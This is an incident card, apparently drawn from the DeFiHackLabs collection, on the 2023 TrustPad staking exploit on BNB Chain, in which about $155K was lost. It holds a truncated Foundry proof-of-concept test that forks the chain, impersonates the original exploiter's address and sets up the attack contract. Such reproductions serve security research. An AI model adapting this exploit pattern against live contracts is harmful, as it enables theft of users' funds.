# [?] TrustPad - Lack of msg.sender address verification

## Summary
Severity: Unknown
Chain: BNB Chain
Component: TrustPad
Published: 2023-11-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TrustPad_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$155K
References:
- https://twitter.com/BeosinAlert/status/1721800306101793188

```solidity
contract ContractTest is Test {
    ILaunchpadLockableStaking private constant LaunchpadLockableStaking =
        ILaunchpadLockableStaking(0xE613c058701C768E0d04D1bf8e6a6dc1a0C6d48A);
    IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
    IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
    HelperContract helperContract;

    function setUp() public {
        vm.createSelectFork("bsc", 33_260_104);
        vm.label(address(LaunchpadLockableStaking), "LaunchpadLockableStaking");
        vm.label(address(TPAD), "TPAD");
        vm.label(address(DDD), "DDD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(this), 0.02 ether);
        // Getting TPAD amount
        WBNBToTPAD();
        // Jump to time when attack was happened
        vm.roll(33_260_391);
        uint256 startBalanceTPAD = TPAD.balanceOf(address(this));

        // Approve all DDD tokens from original exploiter to this attack contract
        vm.prank(TrustPadProtocolExploiter);
        DDD.approve(address(this), type(uint256).max);

        helperContract = new HelperContract();
        emit log_named_decimal_uint(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TrustPad_exp.sol_
